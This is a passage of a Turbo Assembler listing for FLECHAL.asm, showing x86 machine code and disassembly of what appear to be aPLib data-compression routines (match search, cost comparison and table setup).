1  4187	00001EDB  89 44	24 10		 mov dword ptr [esp+10h], eax
1  4188
1  4189	00001EDF			 aplib@256:
1  4190
1  4191	00001EDF  8B 15	000AC1C4r	 mov edx, dword	ptr [aplib@013]
1  4192	00001EE5  8D 81	00016800	 lea eax, dword	ptr [ecx+00016800h]
1  4193	00001EEB  8B 3D	000AC1D0r	 mov edi, dword	ptr [aplib@014]
1  4194	00001EF1  3B C2			 cmp eax, edx
1  4195	00001EF3  76 78			 jbe aplib@254
1  4196	00001EF5  3B CF			 cmp ecx, edi
1  4197	00001EF7  76 02			 jbe aplib@253
1  4198	00001EF9  8B C1			 mov eax, ecx
1  4199
1  4200	00001EFB			 aplib@253:
1  4201
1  4202	00001EFB  2B C7			 sub eax, edi
1  4203
1  4204	00001EFD			 aplib@252:
1  4205
1  4206	00001EFD  8B 0D	000AC1C8r	 mov ecx, dword	ptr [aplib@009]
1  4207	00001F03  8B 2D	000AC1E4r	 mov ebp, dword	ptr [aplib@005]
1  4208	00001F09  8B 0C	81		 mov ecx, dword	ptr [ecx+4*eax]
1  4209	00001F0C  8B 5C	24 28		 mov ebx, dword	ptr [esp+28h]
1  4210	00001F10  03 E9			 add ebp, ecx
1  4211	00001F12  4B			 dec ebx
1  4212	00001F13  89 5C	24 28		 mov dword ptr [esp+28h], ebx
1  4213	00001F17  0F 85	FFFFFEE3	 jne aplib@239
1  4214	00001F1D  33 C9			 xor ecx, ecx
1  4215	00001F1F  E9 FFFFFEDC		 jmp aplib@239
1  4216
1  4217	00001F24			 aplib@257:
1  4218
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 75
FLECHAL.asm



1  4219	00001F24  8B 44	24 1C		 mov eax, dword	ptr [esp+1Ch]
1  4220	00001F28  3B 05	000AC1E8r	 cmp eax, dword	ptr [aplib@016]
1  4221	00001F2E  75 AF			 jne aplib@256
1  4222	00001F30  8B 54	24 24		 mov edx, dword	ptr [esp+24h]
1  4223	00001F34  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4224	00001F38  E8 FFFFF7EB		 call aplib@025
1  4225	00001F3D  8B F0			 mov esi, eax
1  4226	00001F3F  8B D3			 mov edx, ebx
1  4227	00001F41  8B 44	24 1C		 mov eax, dword	ptr [esp+1Ch]
1  4228	00001F45  E8 FFFFF7DE		 call aplib@025
1  4229	00001F4A  8B D6			 mov edx, esi
1  4230	00001F4C  2B D0			 sub edx, eax
1  4231	00001F4E  BE 00000006		 mov esi, 00000006
1  4232	00001F53  8B C2			 mov eax, edx
1  4233	00001F55  C1 FA	1F		 sar edx, 1Fh
1  4234	00001F58  F7 FE			 idiv esi
1  4235	00001F5A  8B 6C	24 24		 mov ebp, dword	ptr [esp+24h]
1  4236	00001F5E  03 C3			 add eax, ebx
1  4237	00001F60  3B C5			 cmp eax, ebp
1  4238	00001F62  0F 82	FFFFFF77	 jb aplib@256
1  4239	00001F68  E9 FFFFFF66		 jmp aplib@255
1  4240
1  4241	00001F6D			 aplib@254:
1  4242
1  4243	00001F6D  33 C0			 xor eax, eax
1  4244	00001F6F  EB 8C			 jmp aplib@252
1  4245
1  4246	00001F71			 aplib@248:
1  4247
1  4248	00001F71  8B 1D	000AC1C4r	 mov ebx, dword	ptr [aplib@013]
1  4249	00001F77  8D 81	00016800	 lea eax, dword	ptr [ecx+00016800h]
1  4250	00001F7D  3B C3			 cmp eax, ebx
1  4251	00001F7F  76 46			 jbe aplib@249
1  4252	00001F81  3B CF			 cmp ecx, edi
1  4253	00001F83  76 02			 jbe aplib@251
1  4254	00001F85  8B C1			 mov eax, ecx
1  4255
1  4256	00001F87			 aplib@251:
1  4257
1  4258	00001F87  2B C7			 sub eax, edi
1  4259
1  4260	00001F89			 aplib@250:
1  4261
1  4262	00001F89  8B 0D	000AC1C8r	 mov ecx, dword	ptr [aplib@009]
1  4263	00001F8F  8B 2D	000AC1E4r	 mov ebp, dword	ptr [aplib@005]
1  4264	00001F95  8B 0C	81		 mov ecx, dword	ptr [ecx+4*eax]
1  4265	00001F98  8B 74	24 28		 mov esi, dword	ptr [esp+28h]
1  4266	00001F9C  03 E9			 add ebp, ecx
1  4267	00001F9E  4E			 dec esi
1  4268	00001F9F  89 74	24 28		 mov dword ptr [esp+28h], esi
1  4269	00001FA3  0F 85	FFFFFE57	 jne aplib@239
1  4270
1  4271	00001FA9			 aplib@238:
1  4272
1  4273	00001FA9  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4274	00001FAD  8B 44	24 24		 mov eax, dword	ptr [esp+24h]
1  4275	00001FB1  89 42	04		 mov dword ptr [edx+04], eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 76
FLECHAL.asm



1  4276	00001FB4  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4277	00001FB8  89 02			 mov dword ptr [edx], eax
1  4278	00001FBA  89 3D	000AC1D0r	 mov dword ptr [aplib@014], edi
1  4279	00001FC0  83 C4	2C		 add esp, 0000002Ch
1  4280	00001FC3  5D			 pop ebp
1  4281	00001FC4  5F			 pop edi
1  4282	00001FC5  5E			 pop esi
1  4283	00001FC6  C3			 ret
1  4284
1  4285	00001FC7			 aplib@249:
1  4286
1  4287	00001FC7  33 C0			 xor eax, eax
1  4288	00001FC9  EB BE			 jmp aplib@250
1  4289
1  4290	00001FCB			 aplib@262:
1  4291
1  4292	00001FCB  8B 4C	24 4C		 mov ecx, dword	ptr [esp+4Ch]
1  4293	00001FCF  85 C9			 test ecx, ecx
1  4294	00001FD1  0F 84	00000991	 je aplib@002	;   0.0402672
1  4295	00001FD7  83 7C	24 50 02	 cmp dword ptr [esp+50h], 00000002
1  4296	00001FDC  0F 82	00000984	 jb aplib@001
1  4297	00001FE2  85 DB			 test ebx, ebx
1  4298	00001FE4  0F 84	0000097C	 je aplib@001
1  4299	00001FEA  BF FEEDABEE		 mov edi, 0FEEDABEEh
1  4300	00001FEF  89 15	000AC1D8r	 mov dword ptr [aplib@003], edx	  ;   0.0403514
1  4301	00001FF5  8D 42	FF		 lea eax, dword	ptr [edx-01]
1  4302	00001FF8  89 0D	000AC1D4r	 mov dword ptr [aplib@004], ecx	  ;   0.0403510
1  4303	00001FFE  A3 000AC1E4r		 mov dword ptr [aplib@005], eax	  ;   0.0403520
1  4304	00002003  8B C1			 mov eax, ecx
1  4305	00002005  89 7C	24 24		 mov dword ptr [esp+24h], edi
1  4306	00002009  33 C1			 xor eax, ecx
1  4307
1  4308	0000200B			 aplib@007:
1  4309
1  4310	0000200B  8B 4C	24 24		 mov ecx, dword	ptr [esp+24h]
1  4311	0000200F  8B 54	24 24		 mov edx, dword	ptr [esp+24h]
1  4312	00002013  C1 E9	1F		 shr ecx, 1Fh
1  4313	00002016  03 D2			 add edx, edx
1  4314	00002018  0B D1			 or edx, ecx
1  4315	0000201A  33 C9			 xor ecx, ecx
1  4316	0000201C  8A 88	00002EC0r	 mov cl, byte ptr [eax+aplib@006]   ;	0.0403000
1  4317	00002022  33 D1			 xor edx, ecx
1  4318	00002024  40			 inc eax
1  4319	00002025  89 54	24 24		 mov dword ptr [esp+24h], edx
1  4320	00002029  3D 00000100		 cmp eax, 00000100h
1  4321	0000202E  72 DB			 jb aplib@007	;   0.0401D0D
1  4322	00002030  85 D2			 test edx, edx
1  4323	00002032  0F 85	000002F0	 jne aplib@008	;   0.040202A
1  4324	00002038  89 1D	000AC1C8r	 mov dword ptr [aplib@009], ebx	  ;   0.0403100
1  4325	0000203E  8B D3			 mov edx, ebx
1  4326	00002040  33 FF			 xor edi, edi
1  4327	00002042  33 DB			 xor ebx, ebx
1  4328
1  4329	00002044			 aplib@012:
1  4330
1  4331	00002044  8D 82	0005A018	 lea eax, dword	ptr [edx+0005A018h]
1  4332	0000204A  8B F7			 mov esi, edi
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 77
FLECHAL.asm



1  4333	0000204C  89 87	000AC1ECr	 mov dword ptr [edi+aplib@010],	eax   ;	  0.0403104
1  4334	00002052  8B C3			 mov eax, ebx
1  4335
1  4336	00002054			 aplib@011:
1  4337
1  4338	00002054  8B 8E	000AC1ECr	 mov ecx, dword	ptr [esi+aplib@010]
1  4339	0000205A  89 1C	01		 mov dword ptr [ecx+eax], ebx
1  4340	0000205D  83 C0	04		 add eax, 00000004
1  4341	00002060  3D 00000400		 cmp eax, 00000400h
1  4342	00002065  75 ED			 jne aplib@011	 ;   0.0401D56
1  4343	00002067  83 C7	04		 add edi, 00000004
1  4344	0000206A  03 D0			 add edx, eax
1  4345	0000206C  3B F8			 cmp edi, eax
1  4346	0000206E  75 D4			 jne aplib@012	 ;   0.0401D46
1  4347	00002070  B9 00000001		 mov ecx, 00000001
1  4348	00002075  BD FFFFFFFF		 mov ebp, 0FFFFFFFFh
1  4349	0000207A  8B 15	000AC1C8r	 mov edx, dword	ptr [aplib@009]
1  4350	00002080  33 F6			 xor esi, esi
1  4351	00002082  33 F8			 xor edi, eax
1  4352	00002084  B8 FFFFFFFF		 mov eax, 0FFFFFFFFh
1  4353	00002089  89 74	24 20		 mov dword ptr [esp+20h], esi
1  4354	0000208D  89 0D	000AC1C4r	 mov dword ptr [aplib@013], ecx	  ;   0.0403504
1  4355	00002093  89 35	000AC1D0r	 mov dword ptr [aplib@014], esi	  ;   0.040350C
1  4356	00002099  89 6C	24 1C		 mov dword ptr [esp+1Ch], ebp
1  4357	0000209D  89 35	000AC1E0r	 mov dword ptr [aplib@015], esi	  ;   0.040351C
1  4358	000020A3  89 32			 mov dword ptr [edx], esi
1  4359	000020A5  8B 15	000AC1D4r	 mov edx, dword	ptr [aplib@004]
1  4360	000020AB  A3 000AC1E8r		 mov dword ptr [aplib@016], eax	  ;   0.0403524
1  4361	000020B0  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  4362	000020B5  8B E9			 mov ebp, ecx
1  4363	000020B7  A3 000AC1CCr		 mov dword ptr [aplib@017], eax	  ;   0.0403508
1  4364	000020BC  8A 18			 mov bl, byte ptr [eax]
1  4365	000020BE  03 C1			 add eax, ecx
1  4366	000020C0  88 1A			 mov byte ptr [edx], bl
1  4367	000020C2  03 D1			 add edx, ecx
1  4368	000020C4  A3 000AC1D8r		 mov dword ptr [aplib@003], eax
1  4369	000020C9  89 15	000AC1D4r	 mov dword ptr [aplib@004], edx
1  4370
1  4371	000020CF			 aplib@036:
1  4372
1  4373	000020CF  3B 6C	24 50		 cmp ebp, dword	ptr [esp+50h]
1  4374	000020D3  0F 83	000006EE	 jnb aplib@018	 ;   0.04024CD
1  4375	000020D9  83 7C	24 58 00	 cmp dword ptr [esp+58h], 00000000
1  4376	000020DE  74 32			 je aplib@019	;   0.0401E14
1  4377	000020E0  FF 44	24 20		 inc dword ptr [esp+20h]
1  4378	000020E4  F6 44	24 20 7F	 test byte ptr [esp+20h], 7Fh
1  4379	000020E9  75 27			 jne aplib@019
1  4380	000020EB  8B 4C	24 4C		 mov ecx, dword	ptr [esp+4Ch]
1  4381	000020EF  A1 000AC1D4r		 mov eax, dword	ptr [aplib@004]
1  4382	000020F4  2B C1			 sub eax, ecx
1  4383	000020F6  8B 5C	24 48		 mov ebx, dword	ptr [esp+48h]
1  4384	000020FA  50			 push eax
1  4385	000020FB  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  4386	00002100  2B C3			 sub eax, ebx
1  4387	00002102  50			 push eax
1  4388	00002103  FF 54	24 60		 call [esp+60h]
1  4389	00002107  83 C4	08		 add esp, 00000008
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 78
FLECHAL.asm



1  4390	0000210A  85 C0			 test eax, eax
1  4391	0000210C  0F 84	00000854	 je aplib@001
1  4392
1  4393	00002112			 aplib@019:
1  4394
1  4395	00002112  3B 6C	24 1C		 cmp ebp, dword	ptr [esp+1Ch]
1  4396	00002116  0F 85	00000213	 jne aplib@020	 ;   0.0402031
1  4397	0000211C  8B 44	24 14		 mov eax, dword	ptr [esp+14h]
1  4398	00002120  89 44	24 04		 mov dword ptr [esp+04], eax
1  4399	00002124  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4400	00002128  89 04	24		 mov dword ptr [esp], eax
1  4401
1  4402	0000212B			 aplib@037:
1  4403
1  4404	0000212B  83 7C	24 04 02	 cmp dword ptr [esp+04], 00000002
1  4405	00002130  0F 8C	000005AC	 jl aplib@021	;   0.04023E8
1  4406	00002136  8B 04	24		 mov eax, dword	ptr [esp]
1  4407	00002139  33 DB			 xor ebx, ebx
1  4408	0000213B  8B 15	000AC1E8r	 mov edx, dword	ptr [aplib@016]
1  4409	00002141  89 5C	24 2C		 mov dword ptr [esp+2Ch], ebx
1  4410	00002145  3B C2			 cmp eax, edx
1  4411	00002147  0F 84	000001FC	 je aplib@022	;   0.040204B
1  4412
1  4413	0000214D			 aplib@039:
1  4414
1  4415	0000214D  8B 4C	24 50		 mov ecx, dword	ptr [esp+50h]
1  4416	00002151  8D 45	01		 lea eax, dword	ptr [ebp+01]
1  4417	00002154  8B 15	000AC1D8r	 mov edx, dword	ptr [aplib@003]
1  4418	0000215A  89 44	24 18		 mov dword ptr [esp+18h], eax
1  4419	0000215E  42			 inc edx
1  4420	0000215F  8B D8			 mov ebx, eax
1  4421	00002161  2B C8			 sub ecx, eax
1  4422	00002163  8D 44	24 10		 lea eax, dword	ptr [esp+10h]
1  4423	00002167  E8 FFFFFB28		 call aplib@023	  ;   0.040197B
1  4424	0000216C  8B 44	24 18		 mov eax, dword	ptr [esp+18h]
1  4425	00002170  8B 0C	24		 mov ecx, dword	ptr [esp]
1  4426	00002173  89 44	24 1C		 mov dword ptr [esp+1Ch], eax
1  4427	00002177  3B 4C	24 10		 cmp ecx, dword	ptr [esp+10h]
1  4428	0000217B  0F 8F	000002C1	 jg aplib@024	;   0.0402144
1  4429	00002181  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4430	00002185  8B C1			 mov eax, ecx
1  4431	00002187  E8 FFFFF59C		 call aplib@025	  ;   0.040140B
1  4432	0000218C  8B 54	24 14		 mov edx, dword	ptr [esp+14h]
1  4433	00002190  8B C8			 mov ecx, eax
1  4434	00002192  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4435	00002196  E8 FFFFF58D		 call aplib@025
1  4436	0000219B  8B D1			 mov edx, ecx
1  4437	0000219D  2B D0			 sub edx, eax
1  4438	0000219F  03 D2			 add edx, edx
1  4439	000021A1  B9 00000009		 mov ecx, 00000009
1  4440	000021A6  8B C2			 mov eax, edx
1  4441	000021A8  C1 FA	1F		 sar edx, 1Fh
1  4442	000021AB  F7 F9			 idiv ecx
1  4443
1  4444	000021AD			 aplib@049:
1  4445
1  4446	000021AD  8B 5C	24 14		 mov ebx, dword	ptr [esp+14h]
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 79
FLECHAL.asm



1  4447	000021B1  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4448	000021B5  03 C3			 add eax, ebx
1  4449	000021B7  3B C2			 cmp eax, edx
1  4450	000021B9  7E 08			 jle aplib@026	 ;   0.0401EC5
1  4451	000021BB  C7 44	24 2C 00000001	 mov dword ptr [esp+2Ch], 00000001
1  4452
1  4453	000021C3			 aplib@026:
1  4454
1  4455	000021C3  85 F6			 test esi, esi
1  4456	000021C5  76 2F			 jbe aplib@027	 ;   0.0401EF8
1  4457	000021C7  8B 44	24 14		 mov eax, dword	ptr [esp+14h]
1  4458	000021CB  3B 44	24 04		 cmp eax, dword	ptr [esp+04]
1  4459	000021CF  7C 25			 jl aplib@027
1  4460	000021D1  8B D0			 mov edx, eax
1  4461	000021D3  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4462	000021D7  E8 FFFFF54C		 call aplib@025
1  4463	000021DC  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4464	000021E0  8B C8			 mov ecx, eax
1  4465	000021E2  8B 04	24		 mov eax, dword	ptr [esp]
1  4466	000021E5  E8 FFFFF53E		 call aplib@025
1  4467	000021EA  3B C8			 cmp ecx, eax
1  4468	000021EC  7D 08			 jge aplib@027
1  4469	000021EE  C7 44	24 2C 00000001	 mov dword ptr [esp+2Ch], 00000001
1  4470
1  4471	000021F6			 aplib@027:
1  4472
1  4473	000021F6  85 F6			 test esi, esi
1  4474	000021F8  0F 85	00000274	 jne aplib@028	 ;   0.0402174
1  4475	000021FE  8B 44	24 14		 mov eax, dword	ptr [esp+14h]
1  4476	00002202  3B 44	24 04		 cmp eax, dword	ptr [esp+04]
1  4477	00002206  0F 8D	00000266	 jnl aplib@028
1  4478	0000220C  8B D0			 mov edx, eax
1  4479	0000220E  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4480	00002212  BB 00000001		 mov ebx, 00000001
1  4481	00002217  E8 FFFFF50C		 call aplib@025
1  4482	0000221C  8B C8			 mov ecx, eax
1  4483	0000221E  8B D5			 mov edx, ebp
1  4484	00002220  A1 000AC1D8r		 mov eax, dword	ptr [aplib@003]
1  4485	00002225  E8 FFFFF22B		 call aplib@029	  ;   0.0401125
1  4486	0000222A  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4487	0000222E  03 C8			 add ecx, eax
1  4488	00002230  8B 04	24		 mov eax, dword	ptr [esp]
1  4489	00002233  E8 FFFFF4F0		 call aplib@025
1  4490	00002238  8D 51	01		 lea edx, dword	ptr [ecx+01]
1  4491	0000223B  3B D0			 cmp edx, eax
1  4492	0000223D  0F 8E	0000022F	 jle aplib@028
1  4493	00002243  89 74	24 2C		 mov dword ptr [esp+2Ch], esi
1  4494
1  4495	00002247			 aplib@050:
1  4496
1  4497	00002247  83 7C	24 04 02	 cmp dword ptr [esp+04], 00000002
1  4498	0000224C  0F 8E	00000141	 jle aplib@030	 ;   0.0402095
1  4499	00002252  8B 4C	24 50		 mov ecx, dword	ptr [esp+50h]
1  4500	00002256  8D 44	24 08		 lea eax, dword	ptr [esp+08]
1  4501	0000225A  8B 15	000AC1D8r	 mov edx, dword	ptr [aplib@003]
1  4502	00002260  8D 5D	02		 lea ebx, dword	ptr [ebp+02]
1  4503	00002263  83 C2	02		 add edx, 00000002
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 80
FLECHAL.asm



1  4504	00002266  2B CB			 sub ecx, ebx
1  4505	00002268  E8 FFFFFA27		 call aplib@023
1  4506	0000226D  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4507	00002271  3B 04	24		 cmp eax, dword	ptr [esp]
1  4508	00002274  0F 8C	00000208	 jl aplib@031	;   0.0402184
1  4509	0000227A  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4510	0000227E  8B 04	24		 mov eax, dword	ptr [esp]
1  4511	00002281  E8 FFFFF4A2		 call aplib@025
1  4512	00002286  8B 54	24 0C		 mov edx, dword	ptr [esp+0Ch]
1  4513	0000228A  8B C8			 mov ecx, eax
1  4514	0000228C  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4515	00002290  E8 FFFFF493		 call aplib@025
1  4516	00002295  8B D1			 mov edx, ecx
1  4517	00002297  2B D0			 sub edx, eax
1  4518	00002299  8B C2			 mov eax, edx
1  4519	0000229B  C1 FA	1F		 sar edx, 1Fh
1  4520	0000229E  C1 E2	02		 shl edx, 02
1  4521	000022A1  1B C2			 sbb eax, edx
1  4522	000022A3  C1 F8	02		 sar eax, 02
1  4523	000022A6  8B 54	24 0C		 mov edx, dword	ptr [esp+0Ch]
1  4524	000022AA  8B 4C	24 04		 mov ecx, dword	ptr [esp+04]
1  4525	000022AE  03 C2			 add eax, edx
1  4526	000022B0  3B C1			 cmp eax, ecx
1  4527
1  4528	000022B2			 aplib@051:
1  4529
1  4530	000022B2  7E 08			 jle aplib@032	 ;   0.0401FBE
1  4531	000022B4  C7 44	24 2C 00000001	 mov dword ptr [esp+2Ch], 00000001
1  4532
1  4533	000022BC			 aplib@032:
1  4534
1  4535	000022BC  85 F6			 test esi, esi
1  4536	000022BE  0F 86	000001FC	 jbe aplib@033	 ;   0.04021C2
1  4537	000022C4  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  4538	000022C8  3B 44	24 04		 cmp eax, dword	ptr [esp+04]
1  4539	000022CC  0F 8C	000001EE	 jl aplib@033
1  4540	000022D2  8B D0			 mov edx, eax
1  4541	000022D4  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4542	000022D8  E8 FFFFF44B		 call aplib@025
1  4543	000022DD  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4544	000022E1  8B C8			 mov ecx, eax
1  4545	000022E3  8B 04	24		 mov eax, dword	ptr [esp]
1  4546	000022E6  E8 FFFFF43D		 call aplib@025
1  4547	000022EB  3B C8			 cmp ecx, eax
1  4548	000022ED  0F 8D	000001CD	 jnl aplib@033
1  4549
1  4550	000022F3			 aplib@040:
1  4551
1  4552	000022F3  85 F6			 test esi, esi
1  4553	000022F5  75 15			 jne aplib@034	 ;   0.040200E
1  4554	000022F7  8B 44	24 04		 mov eax, dword	ptr [esp+04]
1  4555	000022FB  89 44	24 28		 mov dword ptr [esp+28h], eax
1  4556	000022FF  8B 04	24		 mov eax, dword	ptr [esp]
1  4557	00002302  8B 3D	000AC1D8r	 mov edi, dword	ptr [aplib@003]
1  4558	00002308  89 44	24 30		 mov dword ptr [esp+30h], eax
1  4559
1  4560	0000230C			 aplib@034:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 81
FLECHAL.asm



1  4561
1  4562	0000230C  8B 15	000AC1D8r	 mov edx, dword	ptr [aplib@003]
1  4563	00002312  42			 inc edx
1  4564	00002313  46			 inc esi
1  4565	00002314  89 15	000AC1D8r	 mov dword ptr [aplib@003], edx
1  4566
1  4567	0000231A			 aplib@066:
1  4568
1  4569	0000231A  85 F6			 test esi, esi
1  4570	0000231C  0F 85	000003DE	 jne aplib@035	 ;   0.0402406
1  4571
1  4572	00002322			 aplib@069:
1  4573
1  4574	00002322  45			 inc ebp
1  4575	00002323  E9 FFFFFDA7		 jmp aplib@036	 ;   0.0401DD1
1  4576
1  4577	00002328			 aplib@008:
1  4578
1  4579	00002328  8B CA			 mov ecx, edx
1  4580	0000232A  E9 00000639		 jmp aplib@002
1  4581
1  4582	0000232F			 aplib@020:
1  4583
1  4584	0000232F  8B 4C	24 50		 mov ecx, dword	ptr [esp+50h]
1  4585	00002333  8B C4			 mov eax, esp
1  4586	00002335  8B 15	000AC1D8r	 mov edx, dword	ptr [aplib@003]
1  4587	0000233B  8B DD			 mov ebx, ebp
1  4588	0000233D  2B CD			 sub ecx, ebp
1  4589	0000233F  E8 FFFFF950		 call aplib@023
1  4590	00002344  E9 FFFFFDE2		 jmp aplib@037	 ;   0.0401E2D
1  4591
1  4592	00002349			 aplib@022:
1  4593
1  4594	00002349  83 FE	01		 cmp esi, 00000001
1  4595	0000234C  76 45			 jbe aplib@030
1  4596	0000234E  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4597	00002352  3B C2			 cmp eax, edx
1  4598	00002354  74 3D			 je aplib@030
1  4599	00002356  8B D6			 mov edx, esi
1  4600	00002358  E8 FFFFF3CB		 call aplib@025
1  4601	0000235D  8B DE			 mov ebx, esi
1  4602	0000235F  8B C8			 mov ecx, eax
1  4603	00002361  8B D5			 mov edx, ebp
1  4604	00002363  8B C7			 mov eax, edi
1  4605	00002365  E8 FFFFF0EB		 call aplib@029
1  4606	0000236A  3B C8			 cmp ecx, eax
1  4607	0000236C  7D 25			 jge aplib@030
1  4608	0000236E  81 7C	24 30 00000500	 cmp dword ptr [esp+30h], 00000500h
1  4609	00002376  0F 8D	000000B8	 jnl aplib@038	 ;   0.0402136
1  4610
1  4611	0000237C			 aplib@048:
1  4612
1  4613	0000237C  81 7C	24 30 00007D00	 cmp dword ptr [esp+30h], 00007D00h
1  4614	00002384  0F 8C	FFFFFDC3	 jl aplib@039	;   0.0401E4F
1  4615	0000238A  83 FE	03		 cmp esi, 00000003
1  4616	0000238D  0F 85	FFFFFDBA	 jne aplib@039
1  4617
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 82
FLECHAL.asm



1  4618	00002393			 aplib@030:
1  4619
1  4620	00002393  83 7C	24 2C 00	 cmp dword ptr [esp+2Ch], 00000000
1  4621	00002398  0F 85	FFFFFF55	 jne aplib@040	 ;   0.0401FF5
1  4622	0000239E  85 F6			 test esi, esi
1  4623	000023A0  0F 84	0000029B	 je aplib@041	;   0.0402343
1  4624	000023A6  83 FE	01		 cmp esi, 00000001
1  4625	000023A9  0F 86	000002DF	 jbe aplib@042	 ;   0.0402394
1  4626	000023AF  8B CD			 mov ecx, ebp
1  4627	000023B1  8B 44	24 50		 mov eax, dword	ptr [esp+50h]
1  4628	000023B5  2B CE			 sub ecx, esi
1  4629	000023B7  2B C1			 sub eax, ecx
1  4630	000023B9  8B C8			 mov ecx, eax
1  4631	000023BB  3B C6			 cmp eax, esi
1  4632	000023BD  76 02			 jbe aplib@043	 ;   0.04020C3
1  4633	000023BF  8B CE			 mov ecx, esi
1  4634
1  4635	000023C1			 aplib@043:
1  4636
1  4637	000023C1  8D 44	24 08		 lea eax, dword	ptr [esp+08]
1  4638	000023C5  8B DD			 mov ebx, ebp
1  4639	000023C7  8B D7			 mov edx, edi
1  4640	000023C9  2B DE			 sub ebx, esi
1  4641	000023CB  E8 FFFFF8C4		 call aplib@023
1  4642	000023D0  3B 74	24 0C		 cmp esi, dword	ptr [esp+0Ch]
1  4643	000023D4  77 2C			 ja aplib@044	;   0.0402104
1  4644	000023D6  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4645	000023DA  8B D6			 mov edx, esi
1  4646	000023DC  E8 FFFFF347		 call aplib@025
1  4647	000023E1  8B C8			 mov ecx, eax
1  4648	000023E3  8B D6			 mov edx, esi
1  4649	000023E5  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4650	000023E9  E8 FFFFF33A		 call aplib@025
1  4651	000023EE  3B C8			 cmp ecx, eax
1  4652	000023F0  7E 10			 jle aplib@044
1  4653	000023F2  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4654	000023F6  89 44	24 30		 mov dword ptr [esp+30h], eax
1  4655	000023FA  8B 44	24 0C		 mov eax, dword	ptr [esp+0Ch]
1  4656	000023FE  89 44	24 28		 mov dword ptr [esp+28h], eax
1  4657
1  4658	00002402			 aplib@044:
1  4659
1  4660	00002402  8B 44	24 30		 mov eax, dword	ptr [esp+30h]
1  4661	00002406  8B D6			 mov edx, esi
1  4662	00002408  E8 FFFFF31B		 call aplib@025
1  4663	0000240D  8B DE			 mov ebx, esi
1  4664	0000240F  8B C8			 mov ecx, eax
1  4665	00002411  8B D5			 mov edx, ebp
1  4666	00002413  8B C7			 mov eax, edi
1  4667	00002415  E8 FFFFF03B		 call aplib@029
1  4668	0000241A  3B C8			 cmp ecx, eax
1  4669	0000241C  0F 8C	00000198	 jl aplib@045	;   0.04022BC
1  4670
1  4671	00002422			 aplib@047:
1  4672
1  4673	00002422  8B D5			 mov edx, ebp
1  4674	00002424  8B C7			 mov eax, edi
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 83
FLECHAL.asm



1  4675	00002426  E8 FFFFF086		 call aplib@046	  ;   0.0401181
1  4676	0000242B  47			 inc edi
1  4677	0000242C  4E			 dec esi
1  4678	0000242D  75 F3			 jne aplib@047	 ;   0.0402124
1  4679	0000242F  E9 0000020D		 jmp aplib@041
1  4680
1  4681	00002434			 aplib@038:
1  4682
1  4683	00002434  83 FE	02		 cmp esi, 00000002
1  4684	00002437  0F 85	FFFFFF3F	 jne aplib@048	 ;   0.040207E
1  4685	0000243D  E9 FFFFFF51		 jmp aplib@030
1  4686
1  4687	00002442			 aplib@024:
1  4688
1  4689	00002442  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4690	00002446  8B C1			 mov eax, ecx
1  4691	00002448  E8 FFFFF2DB		 call aplib@025
1  4692	0000244D  8B 54	24 14		 mov edx, dword	ptr [esp+14h]
1  4693	00002451  8B C8			 mov ecx, eax
1  4694	00002453  8B 44	24 10		 mov eax, dword	ptr [esp+10h]
1  4695	00002457  E8 FFFFF2CC		 call aplib@025
1  4696	0000245C  8B D1			 mov edx, ecx
1  4697	0000245E  2B D0			 sub edx, eax
1  4698	00002460  8B C2			 mov eax, edx
1  4699	00002462  C1 FA	1F		 sar edx, 1Fh
1  4700	00002465  C1 E2	02		 shl edx, 02
1  4701	00002468  1B C2			 sbb eax, edx
1  4702	0000246A  C1 F8	02		 sar eax, 02
1  4703	0000246D  E9 FFFFFD3B		 jmp aplib@049	 ;   0.0401EAF
1  4704
1  4705	00002472			 aplib@028:
1  4706
1  4707	00002472  83 7C	24 2C 00	 cmp dword ptr [esp+2Ch], 00000000
1  4708	00002477  0F 84	FFFFFDCA	 je aplib@050	;   0.0401F49
1  4709	0000247D  E9 FFFFFF11		 jmp aplib@030
1  4710
1  4711	00002482			 aplib@031:
1  4712
1  4713	00002482  8B 54	24 04		 mov edx, dword	ptr [esp+04]
1  4714	00002486  8B 04	24		 mov eax, dword	ptr [esp]
1  4715	00002489  E8 FFFFF29A		 call aplib@025
1  4716	0000248E  8B 54	24 0C		 mov edx, dword	ptr [esp+0Ch]
1  4717	00002492  8B C8			 mov ecx, eax
1  4718	00002494  8B 44	24 08		 mov eax, dword	ptr [esp+08]
1  4719	00002498  E8 FFFFF28B		 call aplib@025
1  4720	0000249D  8B D1			 mov edx, ecx
1  4721	0000249F  2B D0			 sub edx, eax
1  4722	000024A1  03 D2			 add edx, edx
1  4723	000024A3  B9 0000000B		 mov ecx, 0000000Bh
1  4724	000024A8  8B C2			 mov eax, edx
1  4725	000024AA  C1 FA	1F		 sar edx, 1Fh
